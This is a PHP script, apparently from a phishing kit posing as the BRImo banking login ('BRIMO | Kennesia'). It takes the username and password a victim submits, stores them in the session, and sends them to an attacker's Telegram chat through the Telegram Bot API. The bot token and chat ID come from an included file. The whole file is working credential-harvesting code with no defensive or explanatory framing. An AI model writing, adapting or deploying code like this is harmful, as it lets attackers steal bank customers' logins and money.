<?php

session_start();
include "./kennesia-tID.php";

$user_name            = $_POST['uname'];
$_SESSION['uname'] = $user_name;
$user_pass            = $_POST['pass'];
$_SESSION['pass'] = $user_pass;

$message = "
( BRIMO | Kennesia )
- Username : ".$user_name."
- Password : ".$user_pass."
";

function sendMessage($telegram_id, $message, $usertoken_id) {
    $url = "https://api.telegram.org/bot" . $usertoken_id . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $usertoken_id);
?>